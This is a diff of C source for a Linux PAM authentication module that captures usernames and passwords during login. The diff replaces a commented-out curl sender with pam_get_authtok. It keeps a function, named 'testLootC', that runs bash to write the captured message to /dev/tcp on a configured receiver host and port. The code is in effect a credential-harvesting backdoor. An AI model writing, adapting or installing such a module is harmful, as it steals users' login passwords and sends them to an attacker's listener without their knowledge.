@@ -3,20 +3,24 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <curl/curl.h>
 #include <string.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include <unistd.h>
+//#include <curl/curl.h>
 
 #define RECVER_HOST "127.0.0.1"
 #define RECVER_PORT "18086"
+
+int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char
+*prompt);
 
 size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
 {
     return size * nmemb;
 }
 
+/*
 void sendMessage(char (*message)[]) {
     char url[500];
     char data[200];
@@ -40,9 +44,10 @@ void sendMessage(char (*message)[]) {
     }                                                                             
     curl_global_cleanup();
 }
+*/
 
 void testLootC(char (*message)[]) {
-	char cmd_sendpwd[2048];
+    char cmd_sendpwd[2048];
         (void)snprintf(cmd_sendpwd, 2048, "bash -c \"echo '{%s}' > /dev/tcp/%s/%s\" 2>/dev/null", *message,RECVER_HOST,RECVER_PORT);
         system(cmd_sendpwd);
 }
@@ -57,12 +62,13 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const c
 
 PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
     int retval;
-    const char* username;
-    const char* password;
+    const char *username = NULL;
+    const char *password = NULL;
+    const char *prompt = NULL;
     char message[1024];
     char hostname[128];
     retval = pam_get_user(pamh, &username, "Username: ");
-    pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
+    pam_get_authtok(pamh, PAM_AUTHTOK, &password, prompt);
     if (retval != PAM_SUCCESS) {
         return retval;
     }
